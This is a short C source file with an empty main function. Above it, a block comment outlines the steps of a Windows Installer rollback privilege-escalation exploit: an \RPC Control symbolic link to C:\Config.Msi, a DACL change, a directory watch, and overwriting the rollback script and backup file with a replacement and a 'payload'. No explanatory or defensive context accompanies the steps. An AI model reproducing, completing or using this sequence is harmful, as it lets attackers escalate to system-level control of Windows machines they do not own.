/* NtCreateSymbolicLinkObject("\\RPC Control\\cleanup.stp", "C:\\Config.Msi");
   SetSecurityInfo(directory, SE_FILE_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, acl, NULL);
   ReadDirectoryChangesW(directory, buffer, size, FALSE, FILE_NOTIFY_CHANGE_FILE_NAME, &bytes, NULL, NULL);
   CopyFileW("replacement", "C:\\Config.Msi\\script.rbs", FALSE);
   CopyFileW("payload", "C:\\Config.Msi\\backup.rbf", FALSE);
*/
int main(void) { return 0; }
